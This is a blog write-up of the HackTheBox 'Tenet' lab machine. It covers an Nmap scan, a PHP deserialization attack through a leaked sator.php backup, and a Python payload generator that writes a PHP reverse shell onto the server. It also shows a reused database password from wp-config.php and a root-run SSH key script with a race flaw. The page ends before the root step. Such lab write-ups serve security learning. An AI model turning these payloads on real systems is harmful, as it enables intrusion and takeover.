<html>
	<head>
		<title>Tenet</title>
		<meta name="description" content="When bad house tenets make HackTheBox machines!" />
		<meta name="robots" content="index, follow" />
		<meta property="og:title" content="Tenet" />
		<meta property="og:site_name" content="GhostCcamm's Cyber Misadventures" />
		<meta property="og:description" content="When bad house tenets make HackTheBox machines!" />
		
        <meta property="og:image" content="/images/writeups/htb_machines/tenet/tenet.png" />
    
		<meta charset="utf-8" />
		<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
		<link rel="stylesheet" href="/assets/css/main.css" />
		<link rel="stylesheet" href="/assets/css/styles.css" />
		<noscript><link rel="stylesheet" href="/assets/css/noscript.css" /></noscript>
	</head>
	<body class="is-preload">

		<!-- Page Wrapper -->
			<div id="page-wrapper">

			<!-- Header -->
				<header id="header" class="alt">
					<h1><a href="index.html">GhostCcamm's Cyber Misadventures</a></h1>
					<nav>
						<a href="#menu">Menu</a>
					</nav>
				</header>

			<!-- Menu -->
				<nav id="menu">
					<div class="inner">
						<h2>Menu</h2>
						<ul class="links">
							<li><a href="/">Home</a></li>
							<li><a href="/blog">Blog</a></li>
							<li><a href="/writeups">Write Ups</a></li>
						</ul>
						<a href="#" class="close">Close</a>
					</div>
				</nav>

			<!-- Banner -->
		    <section id="banner">
		      <div class="inner">
		        <div class="logo"><div class="image"><img src="/images/logo.png" alt="" width="75" height="75" /></div></div>
		        <h2>Tenet</h2>
						<p class="date">2021-01-20</p>
		        <p>When bad house tenets make HackTheBox machines!"</p>
		      </div>
		    </section>

      <section id="wrapper">
<section class="wrapper spotlight style4 ">
<div class="inner">
<div class="main_image"><img src=/images/writeups/htb_machines/tenet/tenet.png alt="" /></div>
<div class="content">
<h1 class="major" id="overview">
 Overview
</h1>
<p>
 I am completely confuddled by the ratings of HackTheBox machines lately... Besides Delivery, the latest Easy boxes should of been rated as Medium and vice versa...
</p>
<p>
 <em>
  Tenet was not an exception to this rule.
 </em>
</p>
<p>
 However, I am not gonna lie but I did really enjoy this box! The PHP deserialization attack for initial foothold was simple yet sweet. It was also noice to flex some BashFU for root as well.
</p>
<p>
 I will jump straight into it since this is a fairly quick box.
</p>
</div>
</div>
</section>
<section class="wrapper style2 alt">
<div class="inner">
<div class="content">

<h2 class="major" id="initial-foothold">
 Initial Foothold
</h2>
<p>
 Now I could of assumed that the box had a web server and SSH open, since most boxes have those ports open. Alas, I went down the conservative route and just did the usual Nmap scan.
</p>
<div class="codehilite">
 <pre><span></span><code><span class="nt">Starting</span><span class="w"> </span><span class="nt">Nmap</span><span class="w"> </span><span class="nt">7</span><span class="p">.</span><span class="nc">91</span><span class="w"> </span><span class="o">(</span><span class="w"> </span><span class="nt">https</span><span class="o">://</span><span class="nt">nmap</span><span class="p">.</span><span class="nc">org</span><span class="w"> </span><span class="o">)</span><span class="w"> </span><span class="nt">at</span><span class="w"> </span><span class="nt">2021-01-17</span><span class="w"> </span><span class="nt">09</span><span class="p">:</span><span class="nd">51</span><span class="w"> </span><span class="nt">AWST</span><span class="w"></span>
<span class="nt">Nmap</span><span class="w"> </span><span class="nt">scan</span><span class="w"> </span><span class="nt">report</span><span class="w"> </span><span class="nt">for</span><span class="w"> </span><span class="nt">tenet</span><span class="p">.</span><span class="nc">htb</span><span class="w"> </span><span class="o">(</span><span class="nt">10</span><span class="p">.</span><span class="nc">10</span><span class="p">.</span><span class="nc">10</span><span class="p">.</span><span class="nc">223</span><span class="o">)</span><span class="w"></span>
<span class="nt">Host</span><span class="w"> </span><span class="nt">is</span><span class="w"> </span><span class="nt">up</span><span class="w"> </span><span class="o">(</span><span class="nt">0</span><span class="p">.</span><span class="nc">059s</span><span class="w"> </span><span class="nt">latency</span><span class="o">).</span><span class="w"></span>

<span class="nt">PORT</span><span class="w">   </span><span class="nt">STATE</span><span class="w"> </span><span class="nt">SERVICE</span><span class="w"> </span><span class="nt">VERSION</span><span class="w"></span>
<span class="nt">22</span><span class="o">/</span><span class="nt">tcp</span><span class="w"> </span><span class="nt">open</span><span class="w">  </span><span class="nt">ssh</span><span class="w">     </span><span class="nt">OpenSSH</span><span class="w"> </span><span class="nt">7</span><span class="p">.</span><span class="nc">6p1</span><span class="w"> </span><span class="nt">Ubuntu</span><span class="w"> </span><span class="nt">4ubuntu0</span><span class="p">.</span><span class="nc">3</span><span class="w"> </span><span class="o">(</span><span class="nt">Ubuntu</span><span class="w"> </span><span class="nt">Linux</span><span class="o">;</span><span class="w"> </span><span class="nt">protocol</span><span class="w"> </span><span class="nt">2</span><span class="p">.</span><span class="nc">0</span><span class="o">)</span><span class="w"></span>
<span class="o">|</span><span class="w"> </span><span class="nt">ssh-hostkey</span><span class="o">:</span><span class="w"></span>
<span class="o">|</span><span class="w">   </span><span class="nt">2048</span><span class="w"> </span><span class="nt">cc</span><span class="p">:</span><span class="nd">ca</span><span class="p">:</span><span class="nd">43</span><span class="p">:</span><span class="nd">d4</span><span class="p">:</span><span class="nd">4c</span><span class="p">:</span><span class="nd">e7</span><span class="p">:</span><span class="nd">4e</span><span class="p">:</span><span class="nd">bf</span><span class="p">:</span><span class="nd">26</span><span class="p">:</span><span class="nd">f4</span><span class="p">:</span><span class="nd">27</span><span class="p">:</span><span class="nd">ea</span><span class="p">:</span><span class="nd">b8</span><span class="p">:</span><span class="nd">75</span><span class="p">:</span><span class="nd">a8</span><span class="p">:</span><span class="nd">f8</span><span class="w"> </span><span class="o">(</span><span class="nt">RSA</span><span class="o">)</span><span class="w"></span>
<span class="o">|</span><span class="w">   </span><span class="nt">256</span><span class="w"> </span><span class="nt">85</span><span class="p">:</span><span class="nd">f3</span><span class="p">:</span><span class="nd">ac</span><span class="p">:</span><span class="nd">ba</span><span class="p">:</span><span class="nd">1a</span><span class="p">:</span><span class="nd">6a</span><span class="p">:</span><span class="nd">03</span><span class="p">:</span><span class="nd">59</span><span class="p">:</span><span class="nd">e2</span><span class="p">:</span><span class="nd">7e</span><span class="p">:</span><span class="nd">86</span><span class="p">:</span><span class="nd">47</span><span class="p">:</span><span class="nd">e7</span><span class="p">:</span><span class="nd">3e</span><span class="p">:</span><span class="nd">3c</span><span class="p">:</span><span class="nd">00</span><span class="w"> </span><span class="o">(</span><span class="nt">ECDSA</span><span class="o">)</span><span class="w"></span>
<span class="o">|</span><span class="nt">_</span><span class="w">  </span><span class="nt">256</span><span class="w"> </span><span class="nt">e7</span><span class="p">:</span><span class="nd">e9</span><span class="p">:</span><span class="nd">9a</span><span class="p">:</span><span class="nd">dd</span><span class="p">:</span><span class="nd">c3</span><span class="p">:</span><span class="nd">4a</span><span class="p">:</span><span class="nd">2f</span><span class="p">:</span><span class="nd">7a</span><span class="p">:</span><span class="nd">e1</span><span class="p">:</span><span class="nd">e0</span><span class="p">:</span><span class="nd">5d</span><span class="p">:</span><span class="nd">a2</span><span class="p">:</span><span class="nd">b0</span><span class="p">:</span><span class="nd">ca</span><span class="p">:</span><span class="nd">44</span><span class="p">:</span><span class="nd">a8</span><span class="w"> </span><span class="o">(</span><span class="nt">ED25519</span><span class="o">)</span><span class="w"></span>
<span class="nt">80</span><span class="o">/</span><span class="nt">tcp</span><span class="w"> </span><span class="nt">open</span><span class="w">  </span><span class="nt">http</span><span class="w">    </span><span class="nt">Apache</span><span class="w"> </span><span class="nt">httpd</span><span class="w"> </span><span class="nt">2</span><span class="p">.</span><span class="nc">4</span><span class="p">.</span><span class="nc">29</span><span class="w"> </span><span class="o">((</span><span class="nt">Ubuntu</span><span class="o">))</span><span class="w"></span>
<span class="o">|</span><span class="nt">_http-generator</span><span class="o">:</span><span class="w"> </span><span class="nt">WordPress</span><span class="w"> </span><span class="nt">5</span><span class="p">.</span><span class="nc">6</span><span class="w"></span>
<span class="o">|</span><span class="nt">_http-server-header</span><span class="o">:</span><span class="w"> </span><span class="nt">Apache</span><span class="o">/</span><span class="nt">2</span><span class="p">.</span><span class="nc">4</span><span class="p">.</span><span class="nc">29</span><span class="w"> </span><span class="o">(</span><span class="nt">Ubuntu</span><span class="o">)</span><span class="w"></span>
<span class="o">|</span><span class="nt">_http-title</span><span class="o">:</span><span class="w"> </span><span class="nt">Tenet</span><span class="w"></span>
<span class="nt">Service</span><span class="w"> </span><span class="nt">Info</span><span class="o">:</span><span class="w"> </span><span class="nt">OS</span><span class="o">:</span><span class="w"> </span><span class="nt">Linux</span><span class="o">;</span><span class="w"> </span><span class="nt">CPE</span><span class="o">:</span><span class="w"> </span><span class="nt">cpe</span><span class="o">:/</span><span class="nt">o</span><span class="p">:</span><span class="nd">linux</span><span class="p">:</span><span class="nd">linux_kernel</span><span class="w"></span>

<span class="nt">Service</span><span class="w"> </span><span class="nt">detection</span><span class="w"> </span><span class="nt">performed</span><span class="o">.</span><span class="w"> </span><span class="nt">Please</span><span class="w"> </span><span class="nt">report</span><span class="w"> </span><span class="nt">any</span><span class="w"> </span><span class="nt">incorrect</span><span class="w"> </span><span class="nt">results</span><span class="w"> </span><span class="nt">at</span><span class="w"> </span><span class="nt">https</span><span class="o">://</span><span class="nt">nmap</span><span class="p">.</span><span class="nc">org</span><span class="o">/</span><span class="nt">submit</span><span class="o">/</span><span class="w"> </span><span class="o">.</span><span class="w"></span>
<span class="nt">Nmap</span><span class="w"> </span><span class="nt">done</span><span class="o">:</span><span class="w"> </span><span class="nt">1</span><span class="w"> </span><span class="nt">IP</span><span class="w"> </span><span class="nt">address</span><span class="w"> </span><span class="o">(</span><span class="nt">1</span><span class="w"> </span><span class="nt">host</span><span class="w"> </span><span class="nt">up</span><span class="o">)</span><span class="w"> </span><span class="nt">scanned</span><span class="w"> </span><span class="nt">in</span><span class="w"> </span><span class="nt">9</span><span class="p">.</span><span class="nc">63</span><span class="w"> </span><span class="nt">seconds</span><span class="w"></span>
</code></pre>
</div>
<p>
 Like 99% of the time, the SSH port would not give me an attack vector in
 <em>
  (yet)
 </em>
 , so I visited the website at http://tenet.htb/ after adding
 <code>
  tenet.htb
 </code>
 to my
 <code>
  /etc/hosts
 </code>
 file.
</p>
<p>
 <img alt="" class="center" src="/images/writeups/htb_machines/tenet/tenetweb.png"/>
</p>
<p>
 Seems like another boring Wordpress blog, but it looks like a certain dev called
 <code>
  neil
 </code>
 was peeved off by the main blogger.
</p>
<p>
 <img alt="" class="center" src="/images/writeups/htb_machines/tenet/poorneil.png"/>
</p>
<p>
 If you cannot see the comment from
 <code>
  neil
 </code>
 in the screenshot above, here it is.
</p>
<blockquote>
 <p>
  did you remove the sator php file and the backup?? the migration program is incomplete! why would you do this?!
 </p>
</blockquote>
<p>
 <em>
  Poor Neil and his plights as a developer.
 </em>
</p>
<p>
 I would of felt more sorry for Neil if he demonstrated better OP sec, but thanks to them I knew I would have to find a file called
 <code>
  sator.php
 </code>
 (this was an educated guess).
</p>
<p>
 Most of you reading this know that it is good practice to add the domain of the box to
 <code>
  /etc/hosts
 </code>
 for enumeration purposes, for an example
 <code>
  tenet.htb
 </code>
 . What took me a solid hour to realise is that
 <em>
  just maybe
 </em>
 there is more information on the default site besides the virtual hosts...
</p>
<p>
 I spent over an hour fuzzing for
 <code>
  sator.php
 </code>
 on
 <code>
  tenet.htb
 </code>
 , when actuality it was sitting right in front of me at http://10.10.10.223/sator.php ...
</p>
<p>
 <img alt="" class="center" src="/images/writeups/htb_machines/tenet/sator.png"/>
</p>
<p>
 <em>
  Oooo I surely do like reading about databases on the boxes I am attacking!
 </em>
</p>
<p>
 After wasting about another hour trying to find this backup that
 <code>
  neil
 </code>
 mentioned, I finally found the backup of
 <code>
  sator.php
 </code>
 at http://10.10.10.223/sator.php.bak. If you didn't know this beforehand, the
 <code>
  .bak
 </code>
 extension is commonly used on Linux boxes for backup files; which I did forget about for a bit.
</p>
<div class="codehilite">
 <pre><span></span><code><span class="cp">&lt;?php</span>

<span class="k">class</span> <span class="nc">DatabaseExport</span>
<span class="p">{</span>
    <span class="k">public</span> <span class="nv">$user_file</span> <span class="o">=</span> <span class="s1">'users.txt'</span><span class="p">;</span>
    <span class="k">public</span> <span class="nv">$data</span> <span class="o">=</span> <span class="s1">''</span><span class="p">;</span>

    <span class="k">public</span> <span class="k">function</span> <span class="nf">update_db</span><span class="p">()</span>
    <span class="p">{</span>
        <span class="k">echo</span> <span class="s1">'[+] Grabbing users from text file &lt;br&gt;'</span><span class="p">;</span>
        <span class="nv">$this</span><span class="o">-&gt;</span> <span class="na">data</span> <span class="o">=</span> <span class="s1">'Success'</span><span class="p">;</span>
    <span class="p">}</span>


    <span class="k">public</span> <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span>
    <span class="p">{</span>
        <span class="nb">file_put_contents</span><span class="p">(</span><span class="no">__DIR__</span> <span class="o">.</span> <span class="s1">'/'</span> <span class="o">.</span> <span class="nv">$this</span> <span class="o">-&gt;</span><span class="na">user_file</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">data</span><span class="p">);</span>
        <span class="k">echo</span> <span class="s1">'[] Database updated &lt;br&gt;'</span><span class="p">;</span>
    <span class="c1">//  echo 'Gotta get this working properly...';</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="nv">$input</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'arepo'</span><span class="p">]</span> <span class="o">??</span> <span class="s1">''</span><span class="p">;</span>
<span class="nv">$databaseupdate</span> <span class="o">=</span> <span class="nb">unserialize</span><span class="p">(</span><span class="nv">$input</span><span class="p">);</span>

<span class="nv">$app</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">DatabaseExport</span><span class="p">;</span>
<span class="nv">$app</span> <span class="o">-&gt;</span> <span class="na">update_db</span><span class="p">();</span>


<span class="cp">?&gt;</span><span class="w"></span>
</code></pre>
</div>
<p>
 <strong>
  ooooooooooooOOOOOOOOOOOOooooooooooooo
 </strong>
</p>
<p>
 <em>
  This code looks ripe for a good old PHP deserialization attack!
 </em>
</p>
<p>
 What is PHP serialization you might ask?
 <s>
  If you know about it just skip a bit.
 </s>
</p>
<p>
 Well, the simplified question is how do you send the state of an instance of a class in Object Oriented Programming (OOP) languages? In PHP, this is done by expressing the state of the instance as a formatted string.
</p>
<p>
 Alright hear me out, let us use the code of
 <code>
  sator.php
 </code>
 as an example and get the serialized string of the
 <code>
  $app
 </code>
 instance of
 <code>
  DatabaseExport
 </code>
 using the below code snippet.
</p>
<p>
 <em>
  payload_gen.php
 </em>
</p>
<div class="codehilite">
 <pre><span></span><code><span class="cp">&lt;?php</span>

<span class="k">class</span> <span class="nc">DatabaseExport</span>
<span class="p">{</span>
    <span class="k">public</span> <span class="nv">$user_file</span> <span class="o">=</span> <span class="s1">'users.txt'</span><span class="p">;</span>
    <span class="k">public</span> <span class="nv">$data</span> <span class="o">=</span> <span class="s1">''</span><span class="p">;</span>

    <span class="k">public</span> <span class="k">function</span> <span class="nf">update_db</span><span class="p">()</span>
    <span class="p">{</span>
        <span class="nv">$this</span><span class="o">-&gt;</span> <span class="na">data</span> <span class="o">=</span> <span class="s1">'Success'</span><span class="p">;</span>
    <span class="p">}</span>


    <span class="k">public</span> <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span>
    <span class="p">{</span>
        <span class="nb">file_put_contents</span><span class="p">(</span><span class="no">__DIR__</span> <span class="o">.</span> <span class="s1">'/'</span> <span class="o">.</span> <span class="nv">$this</span> <span class="o">-&gt;</span><span class="na">user_file</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">data</span><span class="p">);</span>
    <span class="c1">//  echo 'Gotta get this working properly...';</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="nv">$app</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">DatabaseExport</span><span class="p">;</span>
<span class="nv">$app</span> <span class="o">-&gt;</span> <span class="na">update_db</span><span class="p">();</span>

<span class="k">echo</span> <span class="nb">serialize</span><span class="p">(</span><span class="nv">$app</span><span class="p">)</span><span class="o">.</span><span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>

<span class="cp">?&gt;</span><span class="w"></span>
</code></pre>
</div>
<div class="codehilite">
 <pre><span></span><code><span class="n">ghostccamm</span><span class="err">@</span><span class="n">kali</span><span class="p">:</span><span class="o">~/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">hackthebox</span><span class="o">/</span><span class="n">machines</span><span class="o">/</span><span class="n">tenet</span><span class="o">/</span><span class="n">get_init</span><span class="o">$</span><span class="w"> </span><span class="n">php</span><span class="w"> </span><span class="n">payload_gen</span><span class="o">.</span><span class="n">php</span><span class="w"></span>
<span class="n">O</span><span class="p">:</span><span class="mi">14</span><span class="p">:</span><span class="s2">"DatabaseExport"</span><span class="p">:</span><span class="mi">2</span><span class="p">:{</span><span class="n">s</span><span class="p">:</span><span class="mi">9</span><span class="p">:</span><span class="s2">"user_file"</span><span class="p">;</span><span class="n">s</span><span class="p">:</span><span class="mi">9</span><span class="p">:</span><span class="s2">"users.txt"</span><span class="p">;</span><span class="n">s</span><span class="p">:</span><span class="mi">4</span><span class="p">:</span><span class="s2">"data"</span><span class="p">;</span><span class="n">s</span><span class="p">:</span><span class="mi">7</span><span class="p">:</span><span class="s2">"Success"</span><span class="p">;}</span><span class="w"></span>
</code></pre>
</div>
<p>
 So we can now see how the objects of the
 <code>
  DatabaseExport
 </code>
 class are serialized.
</p>
<ul>
 <li>
  The 'O' at the start is to signal that the serialized string is an Object of a class.
 </li>
 <li>
  The '14' is the number of letters in the name of the Class that the Object is an instance of. In this case it is
  <code>
   DatabaseExport
  </code>
  .
 </li>
 <li>
  The '2' is the number of properties that the object has.
 </li>
</ul>
<p>
 The following '
 <code>
  {}
 </code>
 ' block then expresses the names of the properties and the values of them as well. So for the
 <code>
  user_file
 </code>
 property of
 <code>
  $app
 </code>
 , the name of the property is a string (
 <code>
  s
 </code>
 ) and is 9 characters and its value is also string.
</p>
<p>
 Still confused? You probably are since I only gave a brief introduction on PHP object serialization. Check out this
 <a href="https://medium.com/swlh/exploiting-php-deserialization-56d71f03282a">
  Medium Article by Vickie Li
 </a>
 where she went into far greater detail about PHP serialization and how you can exploit it.
</p>
<p>
 Getting back to Tenet now, we can modify the
 <code>
  user_file
 </code>
 and
 <code>
  data
 </code>
 properties from the serialized string we send using the GET parameter
 <code>
  arepo
 </code>
 .
</p>
<p>
 <strong>
  This means that we can save a PHP file onto the webserver!
 </strong>
</p>
<p>
 I wrote a neat little Python script that will construct the payload that I will send to the server. The serialized string needed to be URL encoded as well, since it is sent as a GET parameter in the URL.
</p>
<div class="codehilite">
 <pre><span></span><code><span class="kn">import</span> <span class="nn">sys</span><span class="o">,</span> <span class="nn">urllib.parse</span>

<span class="k">def</span> <span class="nf">main</span><span class="p">(</span><span class="n">filename</span><span class="p">):</span>
    <span class="n">lines</span> <span class="o">=</span> <span class="p">[]</span>

    <span class="n">data</span> <span class="o">=</span> <span class="s2">""</span>

    <span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="n">sys</span><span class="o">.</span><span class="n">stdin</span><span class="p">:</span>
        <span class="n">data</span> <span class="o">=</span> <span class="n">data</span> <span class="o">+</span> <span class="n">line</span>

    <span class="n">payload</span> <span class="o">=</span> <span class="s1">'O:14:"DatabaseExport":2:{{s:9:"user_file";s:</span><span class="si">{}</span><span class="s1">:"</span><span class="si">{}</span><span class="s1">";s:4:"data";s:</span><span class="si">{}</span><span class="s1">:"</span><span class="si">{}</span><span class="s1">";}}'</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">filename</span><span class="p">),</span> <span class="n">filename</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">),</span> <span class="n">data</span><span class="p">)</span>

    <span class="nb">print</span><span class="p">(</span><span class="n">urllib</span><span class="o">.</span><span class="n">parse</span><span class="o">.</span><span class="n">quote_plus</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span>


<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">"__main__"</span><span class="p">:</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">filename</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
    <span class="k">except</span><span class="p">:</span>
        <span class="nb">print</span><span class="p">(</span><span class="s2">"You need to give a file name!"</span><span class="p">)</span>
        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>

    <span class="n">main</span><span class="p">(</span><span class="n">filename</span><span class="p">)</span>
</code></pre>
</div>
<p>
 I then just piped the
 <code>
  php-reverse-shell.php
 </code>
 file that comes pre-packaged with Kali Linux as my payload and uploaded it onto the box.
</p>
<p>
 <img alt="" class="center" src="/images/writeups/htb_machines/tenet/exploit.png"/>
</p>
<p>
 Now chucking that payload into the
 <code>
  http://10.10.10.223/sator.php?arepo=&lt;payload here&gt;
 </code>
 , I was able to upload my reverse shell and get initial foothold!
</p>
<p>
 <img alt="" class="center" src="/images/writeups/htb_machines/tenet/noicegotrs.png"/>
</p>
<p>
 <strong>
  nooooOOOooooiice
 </strong>
</p>
</div>
</div>
</section>
<section class="wrapper style1 ">
<div class="inner">
<div class="content">

<h1 class="major" id="getting-user">
 Getting User
</h1>
<p>
 Well after all of this talk about databases, I decided to look for some database credentials. Heading over to
 <code>
  /var/www/html/wordpress/wp-config.php
 </code>
 I found what I was looking for.
</p>
<div class="codehilite">
 <pre><span></span><code><span class="nx">$</span><span class="w"> </span><span class="nx">cat</span><span class="w"> </span><span class="o">/</span><span class="kd">var</span><span class="err">/www/html/wordpress/wp-config.php</span><span class="w"></span>
<span class="cp">&lt;?php</span>
<span class="sd">/**</span>
<span class="sd"> * The base configuration for WordPress</span>
<span class="sd"> *</span>
<span class="sd"> * The wp-config.php creation script uses this file during the</span>
<span class="sd"> * installation. You don't have to use the web site, you can</span>
<span class="sd"> * copy this file to "wp-config.php" and fill in the values.</span>
<span class="sd"> *</span>
<span class="sd"> * This file contains the following configurations:</span>
<span class="sd"> *</span>
<span class="sd"> * * MySQL settings</span>
<span class="sd"> * * Secret keys</span>
<span class="sd"> * * Database table prefix</span>
<span class="sd"> * * ABSPATH</span>
<span class="sd"> *</span>
<span class="sd"> * @link https://wordpress.org/support/article/editing-wp-config-php/</span>
<span class="sd"> *</span>
<span class="sd"> * @package WordPress</span>
<span class="sd"> */</span>

<span class="c1">// ** MySQL settings - You can get this info from your web host ** //</span>
<span class="sd">/** The name of the database for WordPress */</span>
<span class="nb">define</span><span class="p">(</span> <span class="s1">'DB_NAME'</span><span class="p">,</span> <span class="s1">'wordpress'</span> <span class="p">);</span>

<span class="sd">/** MySQL database username */</span>
<span class="nb">define</span><span class="p">(</span> <span class="s1">'DB_USER'</span><span class="p">,</span> <span class="s1">'neil'</span> <span class="p">);</span>

<span class="sd">/** MySQL database password */</span>
<span class="nb">define</span><span class="p">(</span> <span class="s1">'DB_PASSWORD'</span><span class="p">,</span> <span class="s1">'Opera2112'</span> <span class="p">);</span>
</code></pre>
</div>
<p>
 Now I would normally check the contents of the database first, but for some reason I decided to see if I could login as
 <code>
  neil
 </code>
 with the password "Opera2112" (oh by the way he is a user on the box).
</p>
<p>
 <img alt="" class="center" src="/images/writeups/htb_machines/tenet/dbpass.png"/>
</p>
<p>
 <strong>
  Lo and behold! I got neil's account!
 </strong>
</p>
<p>
 To be honest, I felt like wasted all that time with the enumeration and PHP serialization attack that I did earlier where I could of easily bruteforced neil's password with a good educated guess of the password...
</p>
<p>
 <em>
  Like "Opera" is literally in the icon for the box...
 </em>
</p>
<p>
 <img alt="" class="center" src="/images/writeups/htb_machines/tenet/tenet.png"/>
</p>
<p>
 Oh well... I learnt the lesson to always blast boxes with
 <code>
  hydra
 </code>
 and ignore HackTheBox rules. I assume some script kiddie out there was pretty darn happy that for the first time ever bruteforcing SSH works from the very start (if they had a big enough brain to make a good enough wordlist).
</p>
</div>
</div>
</section>
<section class="wrapper style6 alt">
<div class="inner">
<div class="content">

<h1 class="major" id="getting-root">
 Getting Root
</h1>
<p>
 After I got in as
 <code>
  neil
 </code>
 , one of the first things I checked was running
 <code>
  sudo -l
 </code>
 .
</p>
<p>
 <img alt="" class="center" src="/images/writeups/htb_machines/tenet/oooowotsthisthesecond.png"/>
</p>
<p>
 Well that sudoers entry looked way to juicy to ignore, so I took a closer look at
 <code>
  /usr/local/bin/enableSSH.sh
 </code>
 .
</p>
<p>
 <em>
  enableSSH.sh
 </em>
</p>
<div class="codehilite">
 <pre><span></span><code><span class="n">neil</span><span class="nv">@tenet</span><span class="err">:</span><span class="o">~</span><span class="err">$</span><span class="w"> </span><span class="n">cat</span><span class="w"> </span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="k">local</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">enableSSH</span><span class="p">.</span><span class="n">sh</span><span class="w"></span>
<span class="err">#!</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">bash</span><span class="w"></span>

<span class="n">checkAdded</span><span class="p">()</span><span class="w"> </span><span class="err">{</span><span class="w"></span>

<span class="w">    </span><span class="n">sshName</span><span class="o">=</span><span class="err">$</span><span class="p">(</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">echo</span><span class="w"> </span><span class="err">$</span><span class="k">key</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">cut</span><span class="w"> </span><span class="o">-</span><span class="n">d</span><span class="w"> </span><span class="ss">" "</span><span class="w"> </span><span class="o">-</span><span class="n">f</span><span class="w"> </span><span class="mi">3</span><span class="p">)</span><span class="w"></span>

<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="o">[</span><span class="n">[ ! -z $(/bin/grep $sshName /root/.ssh/authorized_keys) </span><span class="o">]</span><span class="err">]</span><span class="p">;</span><span class="w"> </span><span class="k">then</span><span class="w"></span>

<span class="w">        </span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">echo</span><span class="w"> </span><span class="ss">"Successfully added $sshName to authorized_keys file!"</span><span class="w"></span>

<span class="w">    </span><span class="k">else</span><span class="w"></span>

<span class="w">        </span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">echo</span><span class="w"> </span><span class="ss">"Error in adding $sshName to authorized_keys file!"</span><span class="w"></span>

<span class="w">    </span><span class="n">fi</span><span class="w"></span>

<span class="err">}</span><span class="w"></span>

<span class="n">checkFile</span><span class="p">()</span><span class="w"> </span><span class="err">{</span><span class="w"></span>

<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="o">[</span><span class="n">[ ! -s $1 </span><span class="o">]</span><span class="err">]</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="o">[</span><span class="n">[ ! -f $1 </span><span class="o">]</span><span class="err">]</span><span class="p">;</span><span class="w"> </span><span class="k">then</span><span class="w"></span>

<span class="w">        </span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">echo</span><span class="w"> </span><span class="ss">"Error in creating key file!"</span><span class="w"></span>

<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="o">[</span><span class="n">[ -f $1 </span><span class="o">]</span><span class="err">]</span><span class="p">;</span><span class="w"> </span><span class="k">then</span><span class="w"> </span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">rm</span><span class="w"> </span><span class="err">$</span><span class="mi">1</span><span class="p">;</span><span class="w"> </span><span class="n">fi</span><span class="w"></span>

<span class="w">        </span><span class="k">exit</span><span class="w"> </span><span class="mi">1</span><span class="w"></span>

<span class="w">    </span><span class="n">fi</span><span class="w"></span>

<span class="err">}</span><span class="w"></span>

<span class="n">addKey</span><span class="p">()</span><span class="w"> </span><span class="err">{</span><span class="w"></span>

<span class="w">    </span><span class="n">tmpName</span><span class="o">=</span><span class="err">$</span><span class="p">(</span><span class="n">mktemp</span><span class="w"> </span><span class="o">-</span><span class="n">u</span><span class="w"> </span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">ssh</span><span class="o">-</span><span class="n">XXXXXXXX</span><span class="p">)</span><span class="w"></span>

<span class="w">    </span><span class="p">(</span><span class="n">umask</span><span class="w"> </span><span class="mi">110</span><span class="p">;</span><span class="w"> </span><span class="n">touch</span><span class="w"> </span><span class="err">$</span><span class="n">tmpName</span><span class="p">)</span><span class="w"></span>

<span class="w">    </span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">echo</span><span class="w"> </span><span class="err">$</span><span class="k">key</span><span class="w"> </span><span class="o">&gt;&gt;</span><span class="err">$</span><span class="n">tmpName</span><span class="w"></span>

<span class="w">    </span><span class="n">checkFile</span><span class="w"> </span><span class="err">$</span><span class="n">tmpName</span><span class="w"></span>

<span class="w">    </span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">cat</span><span class="w"> </span><span class="err">$</span><span class="n">tmpName</span><span class="w"> </span><span class="o">&gt;&gt;/</span><span class="n">root</span><span class="o">/</span><span class="p">.</span><span class="n">ssh</span><span class="o">/</span><span class="n">authorized_keys</span><span class="w"></span>

<span class="w">    </span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">rm</span><span class="w"> </span><span class="err">$</span><span class="n">tmpName</span><span class="w"></span>

<span class="err">}</span><span class="w"></span>

